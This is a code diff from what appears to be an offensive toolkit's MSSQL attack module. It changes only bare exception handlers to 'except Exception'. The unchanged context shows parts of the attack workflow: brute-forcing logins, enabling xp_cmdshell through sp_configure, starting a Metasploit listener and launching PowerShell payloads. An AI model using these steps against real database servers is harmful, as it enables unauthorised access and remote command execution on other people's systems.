@@ -79,7 +79,7 @@ def brute(ipaddr, username, port, wordlist):
                     break
 
             # if login failed or unavailable server
-            except:
+            except Exception:
                 pass
 
     # if we brute forced a machine
@@ -113,7 +113,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
                            "GO;"
                            "RECONFIGURE;"
                            "GO")
-    except:
+    except Exception:
         pass
     # just throw a simple command via powershell to get the output
     try:
@@ -213,7 +213,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
                 if operating_system == "posix":
                     try:
                         core.module_reload(pexpect)
-                    except:
+                    except Exception:
                         import pexpect
                         core.print_status("Starting the Metasploit listener...")
                         msf_path = core.meta_path()
@@ -250,7 +250,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
 
         try:
             core.module_reload(src.payloads.powershell.prep)
-        except:
+        except Exception:
             import src.payloads.powershell.prep
 
         # launch powershell
@@ -286,7 +286,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
 
             try:
                 core.module_reload(pexpect)
-            except:
+            except Exception:
                 import pexpect
 
             core.print_status("Starting the Metasploit listener...")
@@ -341,7 +341,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
                 core.print_status("Spawning separate child process for listener...")
                 try:
                     shutil.copyfile(os.path.join(core.userconfigpath, "web_clone/x"), definepath)
-                except:
+                except Exception:
                     pass
 
                 # start a threaded webserver in the background
@@ -359,7 +359,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
     # it hangs if thread isnt specified
     try:
         core.module_reload(thread)
-    except:
+    except Exception:
         import thread
 
     # execute the payload
@@ -396,9 +396,9 @@ def deploy_hex2binary(ipaddr, port, username, password):
             child2.interact()
             try:
                 os.remove("x")
-            except:
+            except Exception:
                 pass
-        except:
+        except Exception:
             pass
 
 
@@ -417,7 +417,7 @@ def cmdshell(ipaddr, port, username, password, option):
                         "RECONFIGURE;"
                         "exec master.dbo.sp_configure 'xp_cmdshell', 1;"
                         "RECONFIGURE;")
-    except:
+    except Exception:
         pass
     core.print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
 
